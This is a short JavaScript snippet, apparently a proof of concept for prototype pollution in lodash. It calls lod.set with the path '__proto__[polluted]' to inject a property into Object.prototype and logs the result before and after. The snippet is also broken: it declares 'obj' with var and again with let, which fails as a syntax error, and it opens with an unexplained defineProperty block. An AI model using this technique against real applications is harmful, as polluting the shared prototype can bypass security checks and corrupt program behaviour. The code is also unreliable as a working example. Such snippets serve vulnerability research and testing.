var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const lod = require('lodash');
let obj = {};
console.log({}.polluted);
lod.set(obj, '__proto__[polluted]', 'yes');
console.log({}.polluted);
delete obj.__proto__.polluted;